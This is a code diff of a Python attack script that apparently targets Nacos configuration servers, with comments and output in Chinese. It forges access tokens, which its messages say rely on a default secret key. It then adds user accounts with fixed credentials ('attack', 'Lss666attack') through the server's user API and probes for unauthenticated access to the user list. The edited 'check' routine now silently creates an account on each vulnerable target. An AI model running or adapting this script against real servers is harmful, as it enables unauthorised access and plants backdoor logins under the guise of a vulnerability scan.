@@ -41,63 +41,78 @@ def jwt_token():
 
 def check_vulnerability(url_list):
     for url in url_list:
-        url1 = url
+        urlxianshi = url
+        nacos_index = url.find("/nacos")
+        if nacos_index != -1:
+            url = url[:nacos_index]
         if url.endswith("/"):
             url = url.rstrip("/")
         try:
             token = jwt_token()
-            url = url.strip()+"/nacos/v1/auth/users/login?accessToken="+token  # 去除换行符和空格
-
-            # 发送请求并获取响应
-            data = {'username': '123', 'password': '123'}
-            response = requests.post(url, data=data)
-
-            # 判断是否存在漏洞
-            if response.status_code == 200 or "accessToken" in response.text:
-                print(f"{url1} 存在默认密钥漏洞！可使用token:{token}   /*或使用-uadd url进行添加用户操作。*/")
-            else:
-                check_unauthorized(url)
-        except Exception as e:
-            print(f"检查URL {url1} 时出现错误，错误信息为：{e}")
-
-def creat_user(url_list):
-    for url in url_list:
-        url1 = url
-        try:
-            token = jwt_token()
-            # print("生成的值为：", token)
-            url = url.strip() + "/nacos/v1/auth/users?accessToken=" + token  # 去除换行符和空格
+            url1 = url.strip()+"/nacos/v1/auth/users?accessToken="+token  # 去除换行符和空格
 
             # 发送请求并获取响应
             data = {'username': 'attack', 'password': 'attack'}
-            response = requests.post(url, data=data)
-            # print("Full Request:", response.request.__dict__)
+            response = requests.post(url1, data=data)
 
             # 判断是否存在漏洞
-            if response.status_code == 200:
-                print(f"{url1} 已成功添加用户attack,密码为attack。")
+            if response.status_code == 200 or "accessToken" in response.text:
+                print(f"{urlxianshi} 存在默认密钥漏洞! 已创建用户attack/attack")
+            elif "user 'attack' already exist!" in response.text:
+                print(f"{urlxianshi} 存在默认密钥漏洞！/**/可使用-uadd url进行添加用户操作。/**/")
             else:
-                print(f"{url1} 不存在漏洞，添加漏洞失败")
+                check_unauthorized([url])
         except Exception as e:
-            print(f"检查URL {url1} 时出现错误，错误信息为：{e}")
+            print(f"检查URL {urlxianshi} 时出现错误，错误信息为：{e}")
+
 
 def check_unauthorized(url_list):
     for url in url_list:
-        url1 = url
-        url2 = url.strip() + "/nacos/v1/auth/users?pageNo=1&pageSize=9"  # 去除换行符和空格
+        urlxianshi = url
+        nacos_index = url.find("/nacos")
+        if nacos_index != -1:
+            url = url[:nacos_index]
+        if url.endswith("/"):
+            url = url.rstrip("/")
+        url1 = url.strip() + "/nacos/v1/auth/users?pageNo=1&pageSize=9"  # 去除换行符和空格
         # 发送请求并获取响应
         try:
-            response = requests.get(url2)
+            response = requests.get(url1)
             # print("Full Request:", response.request.__dict__)
 
             # 判断是否存在漏洞
             if response.status_code == 200:
-                print(f"{url1} 存在未授权漏洞，可使用-uadd url进行添加用户操作。")
+                print(f"{urlxianshi} 存在未授权漏洞，可使用-uadd url进行添加用户操作。")
             else:
-                print(f"{url1} 不存在漏洞。")
+                print(f"{urlxianshi} 不存在漏洞。")
         except Exception as e:
-            print(f"检查URL {url1} 时出现错误，错误信息为：{e}")
+            print(f"检查URL {urlxianshi} 时出现错误，错误信息为：{e}")
 
+def creat_user(url_list):
+    for url in url_list:
+        urlxianshi = url
+        nacos_index = url.find("/nacos")
+        if nacos_index != -1:
+            url = url[:nacos_index]
+        if url.endswith("/"):
+            url = url.rstrip("/")
+        try:
+            token = jwt_token()
+            # print("生成的值为：", token)
+            url1 = url.strip() + "/nacos/v1/auth/users?accessToken=" + token  # 去除换行符和空格
+
+            # 发送请求并获取响应
+            data = {'username': 'Lss666attack', 'password': 'Lss666attack'}
+            response = requests.post(url1, data=data)
+            # print("Full Request:", response.request.__dict__)
+
+            # 判断是否存在漏洞
+            if response.status_code == 200:
+                print(f"{urlxianshi} 已成功添加用户Lss666attack,密码为Lss666attack。")
+            else:
+                print(f"{urlxianshi} 不存在漏洞，添加漏洞失败")
+        except Exception as e:
+            print(f"检查URL {urlxianshi} 时出现错误，错误信息为：{e}")
 
 if __name__ == '__main__':
     print("""
@@ -136,7 +151,6 @@ Usage:
 
         # 打印解析后的URLs
         # print(urls)
-
     elif args.url:
         # 检查单个URL
         check_vulnerability([args.url])
